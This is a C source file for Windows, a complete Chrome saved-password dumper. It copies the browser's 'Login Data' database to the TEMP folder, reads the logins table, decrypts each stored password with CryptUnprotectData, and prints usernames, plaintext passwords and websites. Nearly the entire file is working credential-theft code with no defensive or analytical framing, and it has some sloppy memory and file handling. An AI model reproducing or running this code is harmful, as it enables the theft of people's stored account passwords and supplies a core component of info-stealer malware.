#include <stdio.h>
#include <malloc.h>
#include <windows.h>
#include <Wincrypt.h>
#include "sqlite3.h"

#define MAXPATHLEN 256
#define MAXPASSLEN 32

char *app_path;
char *tem_path;
int ID = 1;
int Count = 0;

void GetSystemAppPath()
{
	app_path = (char *)malloc(sizeof(char) * MAXPATHLEN);
	app_path = getenv("LOCALAPPDATA");

	tem_path = (char *)malloc(sizeof(char) * MAXPATHLEN);
	tem_path = getenv("TEMP");

	//FOLDERID_LocalAppData
	//LOCALAPPDATA	vista and later only
	//XP to be done

	//printf("AppPath is : %s\n", app_path);
	//printf("TemPath is : %s\n", tem_path);
}

void unprotectdata(const void *pass, int passlen)
{
	DATA_BLOB DataIn;
	DATA_BLOB DataOut;
	BYTE *pbDataInput = (BYTE *)pass;
	DWORD cbDataInput = passlen;
	LPWSTR pDescrOut = NULL;

	DataIn.pbData = pbDataInput;
	DataIn.cbData = cbDataInput;
	if (CryptUnprotectData(
	&DataIn,
	&pDescrOut,
	NULL,
	NULL,
	NULL,
	0,
	&DataOut))
	{
		printf("%s\t", DataOut.pbData ? DataOut.pbData : (BYTE *)"NULL");
		LocalFree(DataOut.pbData);
	}
	else
	{
		printf("Decryption error!");
	}
}

int DuplicateFile(char *src, char *dst)
{
	FILE *fs, *fd;
	int len;
	void *buffer;
	fs = fopen(src, "rb");
	if (fs == NULL)
	{
		printf("Open Src File Failed!\n");
		fclose(fs);
		return -1;
	}
	fd = fopen(dst, "wb");
	if (fd == NULL)
	{
		printf("Open Dst File Failed!\n");
		fclose(fd);
		return -1;
	}
	fseek(fs, 0, SEEK_END);
	len = ftell(fs);
	rewind(fs);
	buffer = (void *)malloc(len);
	fread(buffer, len, 1, fs);
	fwrite(buffer, len, 1, fd);
	fclose(fs);
	fclose(fd);
	return 0;
}

void GetChromePass()
{
	const void *columncontent;
	char *ChromePath = "\\Google\\Chrome\\User Data\\Default\\Login Data";
	char *decrypt_str;
	char *ChromePass;
	char *TempPass;
	char *dbErrorMsg;
	//char *copy_str;
	sqlite3 *db = 0;
	sqlite3_stmt *stat;
	int loop;
	int ret;
	int passlen;

	printf("[*] Chrome:\n    ");
	printf("ID\tUsername\tPassword\tWebsite\n");

	ChromePass = (char *)malloc(sizeof(char) * MAXPATHLEN * 2);
	TempPass = (char *)malloc(sizeof(char) * MAXPATHLEN * 2);
	dbErrorMsg = (char *)malloc(sizeof(char) * MAXPATHLEN * 2);
	decrypt_str = (char *)malloc(sizeof(char) * MAXPASSLEN);
	//copy_str = (char *)malloc(sizeof(char) * MAXPATHLEN * 2);

	strcpy(ChromePass, app_path);
	strcat(ChromePass, ChromePath);
	//printf("ChromePass is : %s\n", ChromePass);

	strcpy(TempPass, tem_path);
	strcat(TempPass, "\\googlepass");
	//printf("TempPass is : %s\n", TempPass);

	/*
	---------------------use system call to copy files-----------------------
	wsprintf(copy_str,"xcopy /Y \"%s\" \"%s\"", ChromePass, TempPass);
	printf("copy_str is : %s\n", copy_str);
	system(copy_str);
	disadvantage: output "n file(s) copied" can not be removed.
	---------------------use system call to copy files-----------------------
	*/

	DuplicateFile(ChromePass, TempPass);

	ret = sqlite3_open(TempPass, &db);
	//ret = sqlite3_open(ChromePass, &db);

	if (ret)
	{
		printf("Open Database Error!\n");
	}
	else
	{
		sqlite3_prepare(db, "select username_value, password_value, signon_realm from logins", -1, &stat, 0);
		while (sqlite3_step(stat) == SQLITE_ROW)
		{
			printf("    %2d\t", ID++);
			for (loop = 0; loop < 3; loop++)
			{
				sqlite3_column_int(stat, loop);
				columncontent = sqlite3_column_blob(stat, loop);
				passlen = sqlite3_column_bytes(stat, loop);
				if (loop == 1)
				{
					unprotectdata(columncontent, passlen);
				}
				else
					printf("%s\t", columncontent ? columncontent : "NULL");
			}
			printf("\n");
			Count++;
		}
		sqlite3_finalize(stat);
	}
	sqlite3_close(db);
	printf("\n");
	ID = 1;
}

int main()
{
	GetSystemAppPath();
	GetChromePass();
	printf("Count: %d record(s) found!\n", Count);
	getchar();
	return 0;
}